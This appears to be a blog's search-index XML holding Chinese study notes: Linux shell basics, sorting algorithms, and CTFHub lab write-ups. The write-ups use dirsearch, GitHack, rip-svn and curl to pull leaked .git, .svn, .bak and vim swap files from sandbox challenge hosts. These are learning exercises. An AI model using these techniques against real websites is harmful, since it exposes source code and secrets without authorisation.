<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>linux基础</title>
    <url>/2020/06/13/linux%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<h1 id="shell命令"><a href="#shell命令" class="headerlink" title="shell命令"></a>shell命令</h1><h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -F   &#x2F;&#x2F;更好显示格式</span><br><span class="line">ls -a   &#x2F;&#x2F;显示隐藏文件</span><br><span class="line">ls -l   &#x2F;&#x2F;查看文件各种选项</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat -n   &#x2F;&#x2F;显示行号</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">grep keyword des1 des2   &#x2F;&#x2F;在des1和des2里寻找keyword并且返回带有keyword的行</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F;dev -name filename -type d -print</span><br><span class="line">find &#x2F;dev -atime n  &#x2F;&#x2F;最后一次使用在n天前,+n表示大于n，-n表示小于n</span><br><span class="line">find &#x2F;dev -mtime n  &#x2F;&#x2F;最后一次修改在n天前</span><br></pre></td></tr></table></figure>

<p>-type参数：</p>
<table>
<thead>
<tr>
<th>参数</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>b</td>
<td>块文件设备</td>
</tr>
<tr>
<td>c</td>
<td>字符设备文件</td>
</tr>
<tr>
<td>d</td>
<td>目录文件</td>
</tr>
<tr>
<td>f</td>
<td>普通文件</td>
</tr>
<tr>
<td>p</td>
<td>命名管道</td>
</tr>
<tr>
<td>l</td>
<td>符号链接</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">locate xxx.doc   &#x2F;&#x2F;快速定位文件位置</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">whereis find   &#x2F;&#x2F;查找程序</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man find   &#x2F;&#x2F;寻求关于man的操作</span><br><span class="line">whatis find   &#x2F;&#x2F;寻求关于man的操作【简洁】</span><br><span class="line">apropos search   &#x2F;&#x2F;知道功能查找命令，比如像搜索东西时输入左边命令</span><br></pre></td></tr></table></figure>









<h1 id="文件系统"><a href="#文件系统" class="headerlink" title="文件系统"></a>文件系统</h1><h2 id="创建、移动、删除文件"><a href="#创建、移动、删除文件" class="headerlink" title="创建、移动、删除文件"></a>创建、移动、删除文件</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir</span><br><span class="line">mkdir -p ~&#x2F;abc&#x2F;999   &#x2F;&#x2F;-p使得可以创建子目录</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch hello   &#x2F;&#x2F;创建子文件</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mv -i   &#x2F;&#x2F;提示是否覆盖原文件</span><br><span class="line">mv -b   &#x2F;&#x2F;在原文件后加个~</span><br><span class="line">cp -i</span><br><span class="line">cp -b   &#x2F;&#x2F;与mv同理</span><br><span class="line">cp -r test&#x2F; ~&#x2F;Desktop&#x2F;   &#x2F;&#x2F;将test子目录里所有内容移入目标位置</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rm -i   &#x2F;&#x2F;有提示，安全点</span><br><span class="line">rm -r   &#x2F;&#x2F;递归删除子目录下所有内容</span><br></pre></td></tr></table></figure>



<h2 id="文件权限"><a href="#文件权限" class="headerlink" title="文件权限"></a>文件权限</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chown abc:root hhh   &#x2F;&#x2F;将hhh文件的属主换为abc，属组换为root</span><br><span class="line">chown -R abc dir&#x2F;   &#x2F;&#x2F;将dir及其子目录下所有文件交给用户abc</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chgrp group hhh   &#x2F;&#x2F;将文件hhh的属组换为group</span><br></pre></td></tr></table></figure>

<p>chmod：</p>
<table>
<thead>
<tr>
<th>u</th>
<th>文件属主</th>
</tr>
</thead>
<tbody><tr>
<td>g</td>
<td>文件属组</td>
</tr>
<tr>
<td>o</td>
<td>其他人</td>
</tr>
<tr>
<td>a</td>
<td>所有人</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod u+x hhh   &#x2F;&#x2F;给hhh的文件属主增加执行权限</span><br><span class="line">chmod o&#x3D;r hhh   &#x2F;&#x2F;给其他人读hhh文件的权限</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>r</th>
<th>4</th>
</tr>
</thead>
<tbody><tr>
<td>w</td>
<td>2</td>
</tr>
<tr>
<td>x</td>
<td>1</td>
</tr>
</tbody></table>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">chmod 761 hhh   &#x2F;&#x2F;给hhh赋予以下权限：属主rwx，属组rx，其他人x</span><br></pre></td></tr></table></figure>



<h2 id="文件类型"><a href="#文件类型" class="headerlink" title="文件类型"></a>文件类型</h2><table>
<thead>
<tr>
<th>符号</th>
<th>文件类型</th>
</tr>
</thead>
<tbody><tr>
<td>d</td>
<td>目录</td>
</tr>
<tr>
<td>c</td>
<td>字符设备文件</td>
</tr>
<tr>
<td>b</td>
<td>块设备文件</td>
</tr>
<tr>
<td>s</td>
<td>本地域套接口</td>
</tr>
<tr>
<td>p</td>
<td>有名管道</td>
</tr>
<tr>
<td>l</td>
<td>符号链接</td>
</tr>
<tr>
<td>-</td>
<td>普通文件</td>
</tr>
</tbody></table>
<p>字符设备文件（顺序访问设备）：指能从它那里读取成字符序列的设备。如磁带和串行线路。</p>
<p>块设备（随机访问设备）：块设备指用来存储数据并对其各部分内容提供同等访问权的设备，如磁盘。</p>
<h2 id="建立链接"><a href="#建立链接" class="headerlink" title="建立链接"></a>建立链接</h2><h3 id="软链接"><a href="#软链接" class="headerlink" title="软链接"></a>软链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s &#x2F;usr&#x2F;local&#x2F;share&#x2F; 123   &#x2F;&#x2F;建立一个指向&#x2F;usr&#x2F;local&#x2F;share&#x2F;的符号链接123</span><br></pre></td></tr></table></figure>

<p>软链接中，如果删除被指向的文件，连接将失去作用，但如果删除指向文件【123】，被指向的文件并无任何影响。</p>
<h3 id="硬链接"><a href="#硬链接" class="headerlink" title="硬链接"></a>硬链接</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln &#x2F;usr&#x2F;local&#x2F;share&#x2F; 123    &#x2F;&#x2F;建立一个硬链接</span><br></pre></td></tr></table></figure>

<p>对于硬链接，相当于两个完全相同的文件，当年改变其中一个文件时，另一个文件也会随之改变</p>
<h2 id="重定向"><a href="#重定向" class="headerlink" title="重定向"></a>重定向</h2><h3 id="输出重定向"><a href="#输出重定向" class="headerlink" title="输出重定向"></a>输出重定向</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">date &gt; date_out   &#x2F;&#x2F;&gt;会覆盖原date_out文件</span><br><span class="line">ls ~&#x2F; &gt;&gt; lsF   &#x2F;&#x2F;&gt;&gt;会把结果加在原来lsF文件最后</span><br></pre></td></tr></table></figure>

<h3 id="输入重定向"><a href="#输入重定向" class="headerlink" title="输入重定向"></a>输入重定向</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat   &#x2F;&#x2F;每次打印用户的键盘输入，直到用户ctrl C</span><br><span class="line">cat &lt; lsF   &#x2F;&#x2F;将lsF作为输入参数传递给cat</span><br><span class="line">cat &lt;&lt; EOF   &#x2F;&#x2F;每次打印用户的键盘输入，直到遇到参数EOF</span><br></pre></td></tr></table></figure>





<h2 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">command1 | command2   &#x2F;&#x2F;将command1的输出作为command2的输入</span><br></pre></td></tr></table></figure>







<h1 id="shell编程"><a href="#shell编程" class="headerlink" title="shell编程"></a>shell编程</h1><h2 id="几种特殊变量"><a href="#几种特殊变量" class="headerlink" title="几种特殊变量"></a>几种特殊变量</h2><table>
<thead>
<tr>
<th>变量</th>
<th>意义</th>
</tr>
</thead>
<tbody><tr>
<td>$0</td>
<td>文件名</td>
</tr>
<tr>
<td>$1</td>
<td>第一个参数名</td>
</tr>
<tr>
<td>$#</td>
<td>参数个数</td>
</tr>
<tr>
<td>$*/$@</td>
<td>包含参数列表【所有参数】，可用for遍历</td>
</tr>
</tbody></table>
<h2 id="引号"><a href="#引号" class="headerlink" title="引号"></a>引号</h2><table>
<thead>
<tr>
<th>“”</th>
<th>阻止shell对大多数shell字符解释【如#】，但仍解释$、`、“等’’</th>
</tr>
</thead>
<tbody><tr>
<td>‘’</td>
<td>阻止解释所有字符</td>
</tr>
<tr>
<td>``</td>
<td>执行倒引号内的命令</td>
</tr>
</tbody></table>
<h2 id="几种控制语句"><a href="#几种控制语句" class="headerlink" title="几种控制语句"></a>几种控制语句</h2><h3 id="条件判断"><a href="#条件判断" class="headerlink" title="条件判断"></a>条件判断</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if [ &quot;a&quot; &#x3D; &quot;b&quot; ]   &#x2F;&#x2F;空格！！！</span><br><span class="line">if test &quot;a&quot; &#x3D; &quot;b&quot;</span><br></pre></td></tr></table></figure>

<h3 id="比较方法"><a href="#比较方法" class="headerlink" title="比较方法"></a>比较方法</h3><h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4><table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-z str</td>
<td>str长度为0返回真</td>
</tr>
<tr>
<td>-n str</td>
<td>str长度大于0返回真</td>
</tr>
<tr>
<td>str1 = str2</td>
<td>str1等于str2返回真</td>
</tr>
<tr>
<td>str1 != str2</td>
<td>str1不等于str2返回真</td>
</tr>
</tbody></table>
<h4 id="文件比较"><a href="#文件比较" class="headerlink" title="文件比较"></a>文件比较</h4><p><img src="/2020/06/13/linux%E5%9F%BA%E7%A1%80/file.jpg" alt="file"></p>
<h4 id="数字比较"><a href="#数字比较" class="headerlink" title="数字比较"></a>数字比较</h4><table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-eq</td>
<td>=</td>
</tr>
<tr>
<td>-ne</td>
<td>!=</td>
</tr>
<tr>
<td>-lt</td>
<td>&lt;</td>
</tr>
<tr>
<td>-le</td>
<td>&lt;=</td>
</tr>
<tr>
<td>-gt</td>
<td>&gt;</td>
</tr>
<tr>
<td>-ge</td>
<td>&gt;=</td>
</tr>
</tbody></table>
<h4 id="复合表达式"><a href="#复合表达式" class="headerlink" title="复合表达式"></a>复合表达式</h4><table>
<thead>
<tr>
<th>操作符</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>!expr</td>
<td>非</td>
</tr>
<tr>
<td>expr1 -a expr2</td>
<td>与</td>
</tr>
<tr>
<td>expr1 -o expr2</td>
<td>或</td>
</tr>
</tbody></table>
<blockquote>
<p>-a在expr1为假时就不会判断expr2</p>
<p>-o在expr1为真时就不会判断expr2</p>
</blockquote>
<h3 id="几个具体例子"><a href="#几个具体例子" class="headerlink" title="几个具体例子"></a>几个具体例子</h3><h4 id="if"><a href="#if" class="headerlink" title="if"></a>if</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">if test-commands-1</span><br><span class="line">then</span><br><span class="line">	commands-1</span><br><span class="line">elif test-commands-2</span><br><span class="line">then</span><br><span class="line">	commands-2</span><br><span class="line">else</span><br><span class="line">	commands</span><br><span class="line">fi</span><br></pre></td></tr></table></figure>

<h4 id="case"><a href="#case" class="headerlink" title="case"></a>case</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">case word in</span><br><span class="line">	pattern-1)</span><br><span class="line">		command-1</span><br><span class="line">		;;</span><br><span class="line">	pattern-2)</span><br><span class="line">		command-2</span><br><span class="line">		;;</span><br><span class="line">	...</span><br><span class="line">	pattern-n)    &#x2F;&#x2F;此步可用*)来代替default</span><br><span class="line">		command-n</span><br><span class="line">		;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h4 id="while"><a href="#while" class="headerlink" title="while"></a>while</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">while test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="until-测试条件与while相反"><a href="#until-测试条件与while相反" class="headerlink" title="until[测试条件与while相反]"></a>until[测试条件与while相反]</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">until test-commands</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="for"><a href="#for" class="headerlink" title="for"></a>for</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">for variable [in list]</span><br><span class="line">do</span><br><span class="line">	commands</span><br><span class="line">done</span><br></pre></td></tr></table></figure>





<h2 id="一些对shell编程有用的命令"><a href="#一些对shell编程有用的命令" class="headerlink" title="一些对shell编程有用的命令"></a>一些对shell编程有用的命令</h2><h3 id="cut"><a href="#cut" class="headerlink" title="cut"></a>cut</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cut -c3-6 abc.txt   &#x2F;&#x2F;截取每一行第3-6字符</span><br><span class="line">cut -d&quot; &quot; -f2 abc.txt   &#x2F;&#x2F;以&quot; &quot;为分隔符，提取每一行的第二个字段</span><br></pre></td></tr></table></figure>

<h3 id="diff"><a href="#diff" class="headerlink" title="diff"></a>diff</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">diff file1 file2</span><br><span class="line">3c3</span><br><span class="line">4</span><br><span class="line">&lt; you are good</span><br><span class="line">----------------</span><br><span class="line">&gt; you are not </span><br><span class="line">&gt; hhh</span><br><span class="line"></span><br><span class="line">表示file1和file2第三行不同，file1是you are good，file2是you are not，file2多出第四行hhh</span><br></pre></td></tr></table></figure>

<h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort -r -k2 abc.txt   &#x2F;&#x2F;按照第2个字段排序，-r代表倒序</span><br></pre></td></tr></table></figure>

<h3 id="uniq"><a href="#uniq" class="headerlink" title="uniq"></a>uniq</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sort abc.txt | uniq</span><br></pre></td></tr></table></figure>

<p>uniq命令对排序过的文档，对其中重复的行进行去除</p>
<h3 id="tr"><a href="#tr" class="headerlink" title="tr"></a>tr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tr &quot;ABH&quot; &quot;HCA&quot; &lt; abc.txt   &#x2F;&#x2F;将A转为H，将B转为C，将H转为A</span><br><span class="line">tr --delete &quot; &quot; &lt; abc.txt   &#x2F;&#x2F;删除所有空格</span><br></pre></td></tr></table></figure>

<h3 id="wc"><a href="#wc" class="headerlink" title="wc"></a>wc</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc abc.txt</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>选项</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>-c</td>
<td>显示字节数</td>
</tr>
<tr>
<td>-l</td>
<td>显示行数</td>
</tr>
<tr>
<td>-w</td>
<td>显示单词数</td>
</tr>
<tr>
<td>-L</td>
<td>显示最长一行长度</td>
</tr>
</tbody></table>
<h3 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">expr substr &quot;Hello World&quot; 1 5   &#x2F;&#x2F;截取第一个字节到第五个字节[expr不能丢，substr是shell、内建运算符而不是程序]</span><br><span class="line">&gt;&gt;Hello</span><br></pre></td></tr></table></figure>

<h3 id="seq"><a href="#seq" class="headerlink" title="seq"></a>seq</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">seq 9 -3 0   &#x2F;&#x2F;从9-0，步长为-3</span><br><span class="line">&gt;&gt;9</span><br><span class="line">&gt;&gt;6</span><br><span class="line">&gt;&gt;3</span><br><span class="line">&gt;&gt;0</span><br></pre></td></tr></table></figure>





<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ol>
<li><pre><code>num1=1+2
num2=$[ 1 + 2 ]
echo $num1 $num2
&gt;&gt; 1+2 3

expr 1 + 2                     //空格不能少！！！
&gt;&gt; 3
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">2.</span><br></pre></td></tr></table></figure>
8#26   //代表8进制的26
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">3. 对变量第一次赋值时不需要$,引用它的时候就要加上$</span><br></pre></td></tr></table></figure>
name=&quot;hhh&quot;
echo &quot;I am $name&quot;
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">4. 赋值不要加空格，判断要加</span><br></pre></td></tr></table></figure>
name=&quot;hhh&quot;   //赋值不要加
if test &quot;$name&quot; = &quot;hhh&quot;   //判断要加空格
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">5. &amp;&amp;，||，-a，-o</span><br></pre></td></tr></table></figure>
if [ expr1 ] &amp;&amp; [expr2]
if [ expr1 -a expr2 ]</code></pre></li>
</ol>
]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title>泄露</title>
    <url>/2020/06/02/git%E6%B3%84%E9%9C%B2/</url>
    <content><![CDATA[<h1 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h1><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><p>先还是dirsearch扫一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;dirsearch.py -u &quot;http:&#x2F;&#x2F;challenge-14f2f8d51098f12f.sandbox.ctfhub.com:10080&#x2F;&quot; -e *</span><br></pre></td></tr></table></figure>

<p>然后githack克隆一下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python2 GitHack.py http:&#x2F;&#x2F;challenge-885f3dc042d14377.sandbox.ctfhub.com:10080&#x2F;.git</span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>git log可以查看日志 就是看看历史版本中都干了些什么</li>
<li>git reset –-hard 版本号    就可以回到指定的版本 </li>
</ul>
</blockquote>
<p><img src="/2020/06/02/git%E6%B3%84%E9%9C%B2/1.png" alt="1"></p>
<p>我们现在是在“remove flag”版本，而flag应该是在add flag版本，所以以下有两种办法</p>
<ul>
<li><p>转到add flag版本</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset --hard 081a3f042a3b19429a61</span><br></pre></td></tr></table></figure>
</li>
<li><p>比对两者的区别</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff 081a</span><br></pre></td></tr></table></figure>





</li>
</ul>
<h2 id="stash"><a href="#stash" class="headerlink" title="stash"></a>stash</h2><p>关于<a href="https://jingyan.baidu.com/article/49ad8bceacac6b5834d8fa9a.html" target="_blank" rel="noopener">git stash</a></p>
<p>前面几步都一样，直到Githack克隆到本地。</p>
<p>然后用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git pop</span><br></pre></td></tr></table></figure>

<p>弹出堆栈里的flag</p>
<h1 id="SVN泄露"><a href="#SVN泄露" class="headerlink" title="SVN泄露"></a>SVN泄露</h1><p>先用dirsearch扫描发现/.svn</p>
<p>于是用dvcs-ripper里输入以下命令进行扫描</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.&#x2F;rip-svn.pl -v -u http:&#x2F;&#x2F;challenge-4410f020906ef0d6.sandbox.ctfhub.com:10080&#x2F;.svn&#x2F;</span><br></pre></td></tr></table></figure>

<p>扫描完输入命令【一定要有-a才能看到隐藏文件夹】</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -al</span><br></pre></td></tr></table></figure>

<p>进入pristine文件夹寻找得到flag</p>
<h1 id="HG泄露"><a href="#HG泄露" class="headerlink" title="HG泄露"></a>HG泄露</h1><p>这个工具出了点问题等调试好补上！</p>
]]></content>
      <tags>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>备份文件下载</title>
    <url>/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/</url>
    <content><![CDATA[<p>今天刷了ctfhub里的备份文件下载的四题，学到了一些东西，初步学会使用了dirsearch工具，这个东东我下在kali里了，在~/dirsearch里头使用命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 dirsearch.py -u http:&#x2F;&#x2F;challenge-91f1f5e6a791ab02.sandbox.ctfhub.com:10080&#x2F; -e *</span><br></pre></td></tr></table></figure>

<p>就可以扫描这个网站了</p>
<p>接着具体分析这四题：</p>
<h2 id="网站源码"><a href="#网站源码" class="headerlink" title="网站源码"></a>网站源码</h2><p><img src="/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/1.png" alt="1"></p>
<p>这玩意直接扫描就可以了，要是想精确点，就把文件名和后缀遍历组合就可以了。</p>
<h2 id="bak文件"><a href="#bak文件" class="headerlink" title="bak文件"></a>bak文件</h2><blockquote>
<p>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</p>
<p>bak文件泄露</p>
<p>有些时候网站管理员可能为了方便，会在修改某个文件的时候先复制一份，将其命名为xxx.bak。而大部分Web Server对bak文件并不做任何处理，导致可以直接下载，从而获取到网站某个文件的源代码。</p>
</blockquote>
<p><img src="/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/2.png" alt="2"></p>
<p>根据提示，知文件可能在/index.php.bak里，下载下来去掉尾部的.bak即可。</p>
<h2 id="vim缓存"><a href="#vim缓存" class="headerlink" title="vim缓存"></a>vim缓存</h2><blockquote>
<p>当开发人员在线上环境中使用 vim 编辑器，在使用过程中会留下 vim 编辑器缓存，当vim异常退出时，缓存会一直留在服务器上，引起网站源码泄露。</p>
<p>非正常关闭vim编辑器时会生成一个.swp文件</p>
<p>在使用vim时会创建临时缓存文件，关闭vim时缓存文件则会被删除，当vim异常退出后，因为未处理缓存文件，导致可以通过缓存文件恢复原始文件内容。</p>
<p>以 index.php 为例：第一次产生的交换文件名为 .index.php.swp</p>
<p>再次意外退出后，将会产生名为 .index.php.swo 的交换文件</p>
<p>第三次产生的交换文件则为 .index.php.swn。</p>
</blockquote>
<p><img src="/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/3.png" alt="3"></p>
<p>因为这里已经告诉我们是index.php了，所以其意外退出而保留的临时文件是 .index.php.swp，我们访问/.index.php.swp【注意前面的点不能少】，得到交换文件.swp。</p>
<p>下载到本地后使用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim -r .index.php.swp</span><br></pre></td></tr></table></figure>

<p>即可自动恢复得到flag。</p>
<blockquote>
<p>我们对给文件内容另存为，只要在:w 后面加上文件名字，就能把当前的编辑内容另存到其他文件中去。:w new_filename</p>
</blockquote>
<p>还可以使用curl命令直接得到flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">curl http:&#x2F;&#x2F;challenge-c11057ca9f308893.sandbox.ctfhub.com:10080&#x2F;.index.php.swp</span><br></pre></td></tr></table></figure>



<h2 id="DS-Store"><a href="#DS-Store" class="headerlink" title="DS_Store"></a>DS_Store</h2><blockquote>
<p>.DS_Store 是 Mac OS 保存文件夹的自定义属性的隐藏文件。通过.DS_Store可以知道这个目录里面所有文件的清单。</p>
</blockquote>
<p><a href="https://www.cnblogs.com/anweilx/p/12421753.html" target="_blank" rel="noopener">看这里看这里，有个关于Python-dsstore的东东</a></p>
<p>最后最后，六一儿童节了，放上一张刚才一个人出去拍的照片。</p>
<p><img src="/2020/06/01/%E5%A4%87%E4%BB%BD%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD/6.jpg" alt="6"></p>
]]></content>
      <tags>
        <tag>ctfhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Nmap</title>
    <url>/2020/05/31/Nmap/</url>
    <content><![CDATA[<p><img src="/2020/05/31/Nmap/1.png" alt="2"></p>
<p><img src="/2020/05/31/Nmap/2.png" alt="2"></p>
]]></content>
  </entry>
  <entry>
    <title>几种排序算法</title>
    <url>/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h1 id="对一个排序算法的分析"><a href="#对一个排序算法的分析" class="headerlink" title="对一个排序算法的分析"></a>对一个排序算法的分析</h1><h2 id="排序算法的执行效率"><a href="#排序算法的执行效率" class="headerlink" title="排序算法的执行效率"></a>排序算法的执行效率</h2><h3 id="最好情况、最坏情况、平均情况时间复杂度"><a href="#最好情况、最坏情况、平均情况时间复杂度" class="headerlink" title="最好情况、最坏情况、平均情况时间复杂度"></a>最好情况、最坏情况、平均情况时间复杂度</h3><p>之所以要分这三种情况，主要是因为各个数组的有序度不同，有序度不同的数据，对于排序的执行时间肯定有影响</p>
<h3 id="时间复杂度的系数、常数、低阶"><a href="#时间复杂度的系数、常数、低阶" class="headerlink" title="时间复杂度的系数、常数、低阶"></a>时间复杂度的系数、常数、低阶</h3><p>排序时的数据规模可能不是那么大，此时就要把系数、常数、低阶都考虑进来。</p>
<h3 id="比较次数和交换（或移动）次数"><a href="#比较次数和交换（或移动）次数" class="headerlink" title="比较次数和交换（或移动）次数"></a>比较次数和交换（或移动）次数</h3><p>这就是比较排序算法涉及的两种操作：比较和交换</p>
<h2 id="排序算法的内存消耗"><a href="#排序算法的内存消耗" class="headerlink" title="排序算法的内存消耗"></a>排序算法的内存消耗</h2><p>大致上与空间复杂度挂钩。引入概念：<strong>原地排序</strong>【空间复杂度为1的排序算法】。</p>
<h2 id="排序算法的稳定性"><a href="#排序算法的稳定性" class="headerlink" title="排序算法的稳定性"></a>排序算法的稳定性</h2><p><strong>稳定性</strong>是指：如果待排序的元素中存在值相等的元素，经过排序之后，相等元素之间原有的先后顺序保持不变。</p>
<h3 id="稳定算法实例"><a href="#稳定算法实例" class="headerlink" title="稳定算法实例"></a>稳定算法实例</h3><p>给订单排序。订单有两个属性：下单时间和订单金额。希望对金额从小到大排序，金额相同的订单，按照下单时间从早到晚排序。</p>
<p>步骤：</p>
<ol>
<li>对下单时间进行从早到晚的排序</li>
<li>使用稳定排序算法对下单金额进行从小到大的排序</li>
</ol>
<p>由于是稳定的排序算法，当对金额排序时，如果又金额相同的，也不会改变原有对下单时间早晚的排序，详情见下图：</p>
<p><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/1.jpg" alt="1"></p>
<h1 id="几种常见的排序算法"><a href="#几种常见的排序算法" class="headerlink" title="几种常见的排序算法"></a>几种常见的排序算法</h1><h2 id="冒泡排序"><a href="#冒泡排序" class="headerlink" title="冒泡排序"></a>冒泡排序</h2><img src="/2020/05/29/%E5%87%A0%E7%A7%8D%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95/2.jpg" alt="2" style="zoom:50%;">

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> i,j,tmp;</span><br><span class="line">	<span class="keyword">int</span> a[<span class="number">6</span>]=&#123;<span class="number">3</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">6</span>&#125;;</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">5</span>;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;<span class="number">5</span>-i;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(a[j]&gt;a[j+<span class="number">1</span>])</span><br><span class="line">			&#123;</span><br><span class="line">				tmp = a[j];</span><br><span class="line">				a[j] = a[j+<span class="number">1</span>];</span><br><span class="line">				a[j+<span class="number">1</span>] = tmp;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="冒泡排序是原地排序算法吗？"><a href="#冒泡排序是原地排序算法吗？" class="headerlink" title="冒泡排序是原地排序算法吗？"></a>冒泡排序是原地排序算法吗？</h3><p>是的。冒泡排序只涉及相邻数据的交换，只需要常量级的临时空间，空间复杂度为O(1)。</p>
<h3 id="冒泡排序是稳定的排序算法吗？"><a href="#冒泡排序是稳定的排序算法吗？" class="headerlink" title="冒泡排序是稳定的排序算法吗？"></a>冒泡排序是稳定的排序算法吗？</h3><p>是的。当相邻数据比较大小相等时，不交换数据即可。</p>
